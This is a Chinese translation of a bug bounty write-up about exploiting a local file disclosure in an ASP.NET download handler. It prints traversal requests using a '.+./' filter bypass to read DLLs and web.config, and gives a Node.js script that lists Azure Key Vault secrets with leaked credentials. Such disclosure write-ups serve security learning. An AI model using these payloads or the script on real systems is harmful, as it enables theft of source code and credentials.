> 原文链接: https://www.anquanke.com//post/id/168302 


# 我是如何通过ASP Secrets读取获得1.7万美金奖励的


                                阅读量   
                                **218953**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">1</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者samcurry，文章来源：samcurry.net
                                <br>原文地址：[https://samcurry.net/reading-asp-secrets-for-17000/](https://samcurry.net/reading-asp-secrets-for-17000/)

译文仅供参考，具体内容表达以及含义原文为准

[![](https://p5.ssl.qhimg.com/dm/1024_537_/t01033fc72f578a48d9.png)](https://p5.ssl.qhimg.com/dm/1024_537_/t01033fc72f578a48d9.png)



## 概述

ASP.NET应用程序中比较常见的漏洞之一是本地文件泄露。如果您从未开发或利用过这种技术，那么对LFD的漏洞利用可能会非常困难，并且没有实际作用。在本文中，我描述了如何攻击一个存在LFD漏洞的应用程序，以及后续的漏洞利用方法。



## 定位漏洞

在最近的漏洞挖掘工作中，我遇到了这个站点：

[https://domain.com/utility/download.aspx?f=DJ/lc1jVgHTZF](https://domain.com/utility/download.aspx?f=DJ/lc1jVgHTZF)…

在加载页面时，它会从服务器上的另一个路径下载帮助文档。由于这是一个加密的参数，因此我不认为我可以篡改其原有的功能，但我在思考是否有任何可以进行的工作。如果我能够攻破用来签署参数的密钥（可能是AES加密），那么就可以伪造参数并进行LFD漏洞利用。

令人惊讶的是，我偶然看到网站上的一些原有内容使用了相同的站点，其地址如下：

[https://domain.com/utility/download.aspx?f=file1234.docx](https://domain.com/utility/download.aspx?f=file1234.docx)

同时，接收内容如下：

```
HTTP/1.1 200 OK
Connection: close
Content-Length: 27363

Ïó|uœ Z^ tÙ¢yÇ¯;¬!Y, `}``{`ûCƒ³/h&gt; 
...

```

在发现这一点之后，我做的第一件事是提供download.aspx作为参数，但之后令人更加惊讶的是，我们发现了download.aspx文件的来源

```
GET /utility/download.aspx?f=download.aspx

HTTP/1.1 200 OK
Connection: close
Content-Length: 263

&lt;%@ Page Language="C#" AutoEventWireup="true" Debug="true" %&gt;
...
```

通过阅读download.aspx，我们可以访问任意文件，但这并没有真正意义上证明其影响，因为“文件背后的代码”（存储文件的真正来源）位于filename.aspx.cx。我尝试过，但没有作用。

事实证明，我在尝试的过程中，无法访问.aspx.cs文件。有关.aspx与.aspx.cs之间差异的更多信息，建议参考：

[https://stackoverflow.com/questions/13182757/what-is-the-difference-between-aspx-and-aspx-cs](https://stackoverflow.com/questions/13182757/what-is-the-difference-between-aspx-and-aspx-cs) 。

这是我们必须找到解决方法的一个位置，但是现在，我们应该尝试从不同的目录中读取，这样就能利用漏洞获取到更多的权限。



## 绕过遍历屏蔽

我发现的另一点，是无法在后面存在两个点（..）,否则请求会响应400错误，并出现失败。

我采取的思路，是进行模糊测试，从而查看是否有任何字符可以忽略或实现连接。

我使用了以下的请求：

```
GET /utility/download.aspx?f=.[fuzz]./utility/download.aspx
```

[![](https://p4.ssl.qhimg.com/t0112764c68cf17ee32.png)](https://p4.ssl.qhimg.com/t0112764c68cf17ee32.png)

随后，我开始手动迭代字符，最终发现.+./utility/download.aspx可以返回download.aspx的内容。这非常棒，因为现在可以实现目录遍历了。其具体原因我不清楚，我曾经在自己的ASP.NET应用程序上尝试过相同的方法，以判断这是否属于一个通用漏洞，但它在我的应用程序上不起作用。我的猜测是，它与窗口的文件名有关，并且其文件名中应该包含空格。尽管我进行了猜测，但是还没有进行过深入的研究。



## 获取部分源代码

由于我现在可以读取这些路径，因此尝试的第一件事就是读取.ashx文件。考虑到这些是处理程序而不是表示文件（参见： [https://www.dotnetperls.com/ashx](https://www.dotnetperls.com/ashx) ），我猜测它们是可访问的。

确实如此！

```
HTTP/1.1 200 OK
Connection: close
Content-Length: 2398

&lt;%@ WebHandler Language="C#" Class="redacted.redacted" %&gt;

Imports System
Imports System.Data
Imports System.Data.SqlClient
Imports System.IO
Imports System.Web
Imports System.Configuration
...

```

这至少表明，我们能够获得一些敏感的内容。我的下一步计划是尝试能否阅读更多的源代码。

我们在仔细阅读ASP.NET应用程序文档时，发现其编译后的类保存在/bin/className.dll中。这意味着我们应该能够提取.ashx文件中引用的类名。

通过发出一下请求，我能够获得源文件的DLL（有关存储的DLL的更多信息，请参见： [https://blogs.msdn.microsoft.com/tom/2008/07/21/asp-net-tips-loading-a-dll-out-of-the-bin-directory/](https://blogs.msdn.microsoft.com/tom/2008/07/21/asp-net-tips-loading-a-dll-out-of-the-bin-directory/) ）

```
GET /utility/download.aspx?f=.+./.+./bin/redacted.dll
```

在下载后，攻击者可以使用dnSpy导入DLL，并恢复应用程序的源代码。除此之外，还有更多可以遍历的类，能够从中得到源代码

[![](https://p2.ssl.qhimg.com/t01c9cdb33846ed78c5.png)](https://p2.ssl.qhimg.com/t01c9cdb33846ed78c5.png)



## 获取web.config中Azure密钥

在ASP.NET应用程序中，使用到的配置文件之一是web.config。在这里，要感谢 [@nahamsec](https://github.com/nahamsec)的强烈建议让我们读取这一文件。

该文件从本质上来说，是一个设置页面，其中包含从单个页面到整个Web服务器的其他变量。在这里，保存了大量敏感信息，例如SQL凭证、上述参数的加密密钥以及应用程序使用的内部端点。

下面是一个示例web.config文件：

```
&lt;?xml version="1.0" encoding="utf-8"?&gt;
&lt;!--
  For more information on how to configure your ASP.NET application, please visit
  http://go.microsoft.com/fwlink/?LinkId=301880
  --&gt;
&lt;configuration&gt;
  &lt;appSettings&gt;
    &lt;add key="webpages:Version" value="3.0.0.0" /&gt;
    &lt;add key="webpages:Enabled" value="false" /&gt;
    &lt;add key="ClientValidationEnabled" value="true" /&gt;
    &lt;add key="UnobtrusiveJavaScriptEnabled" value="true" /&gt;

    &lt;add key="PodioClientId" value="" /&gt;
    &lt;add key="PodioClientSecret" value="" /&gt;

    &lt;add key="AppId" value="" /&gt;
    &lt;add key="SpaceId" value="" /&gt;
  &lt;/appSettings&gt;

  &lt;connectionStrings&gt;
    &lt;remove name="umbracoDbDSN" /&gt;
    &lt;add name="PodioAspnetSampleDb" connectionString="server=WSA07;database=PodioAspnetSampleDb;user id=sa;password=pass" providerName="System.Data.SqlClient" /&gt;
  &lt;/connectionStrings&gt;

  &lt;system.web&gt;
    &lt;compilation debug="true" targetFramework="4.5" /&gt;
    &lt;httpRuntime targetFramework="4.5" /&gt;
  &lt;/system.web&gt;
&lt;/configuration&gt;
```

要阅读赏金计划目标主机上的web.config，我们只需要发送以下请求：

```
GET /utility/download.aspx?f=.+./.+./web.config
```

其响应中，包含了许多Secrets，但最严重的一个是下面的密钥被公开：

```
...
&lt;add key="keyVaultDataPlaneUri" value="redacted" /&gt;
&lt;add key="uniqueKeyVaultNameUri" value="redacted" /&gt;
&lt;add key="keyVaultClientId" value="redacted" /&gt;
&lt;add key="keyVaultClientSecretIdentifier" value="redacted" /&gt;
&lt;add key="keyVaultClientTenantName" value="redacted" /&gt;
&lt;add key="keyVaultAuthenticationContextUri" value="redacted" /&gt;
&lt;add key="keyVaultApiVersion" value="2016-10-01" /&gt;
...
```

如果正确利用这个密钥，就能够访问Azure Key Vault实例。Azure Key Vault用于保存应用程序的Secrets，其中通常包括一些很有价值的内容。

现在，要解决的问题就是如何发送请求才能访问到这些Secrets。与shubs（ [https://twitter.com/infosec_au](https://twitter.com/infosec_au) ）进行交流后，他迅速帮助我将Node.js脚本整合在一起，然后使用公开的密钥访问Azure Key Vault实例。

```
var KeyVault = require('azure-keyvault');
var AuthenticationContext = require('adal-node').AuthenticationContext;

var clientId = "clientId";
var clientSecret = "clientSecret";
var vaultUri = "vaultUri";

// Authenticator - retrieves the access token
var authenticator = function (challenge, callback) `{`

  // Create a new authentication context.
  var context = new AuthenticationContext(challenge.authorization);

  // Use the context to acquire an authentication token.
  return context.acquireTokenWithClientCredentials(challenge.resource, clientId, clientSecret, function (err, tokenResponse) `{`
    if (err) throw err;
    // Calculate the value to be set in the request's Authorization header and resume the call.
    var authorizationValue = tokenResponse.tokenType + ' ' + tokenResponse.accessToken;
    console.log(authorizationValue);
    return callback(null, authorizationValue);
  `}`);

`}`;

var credentials = new KeyVault.KeyVaultCredentials(authenticator);
var client = new KeyVault.KeyVaultClient(credentials);

client.getSecrets(vaultUri).then(function(value) `{`
    console.log(value);
`}`);
```

响应如下：

```
`{` id:
     'https://redacted.vault.azure.net/secrets/ftp_credentials',
    attributes:
     `{` enabled: true,
       created: 2018-01-23T22:14:18.000Z,
       updated: 2018-01-23T22:14:18.000Z,
       recoveryLevel: 'Purgeable' `}`,
    contentType: 'secret' `}` ]

... more secrets ...
```

这样一来，游戏就结束了。因为Secrets中包含允许攻击者进行完全写入和读取访问操作的凭据。



## 总结

我们总结了两点。如果希望从ASP.NET中访问源文件，我们可以尝试从/bin/className.dll中读取。如果想要查看Secrets，可以从web.config中读取。

如果想要更好地了解如何攻击ASP.NET应用程序，可以花费一些时间来研究它们。实际上，有很多共同的问题（强制浏览、身份验证绕过、Shell上传、LFD、LFI等），如果我们能注意到每个请求中发送的视图状态Token，那么就应该能注意到这些问题。



## 时间线

报告漏洞 2018年9月25日

确认漏洞 2018年9月27日

收到17000美元奖金 2018年9月29日
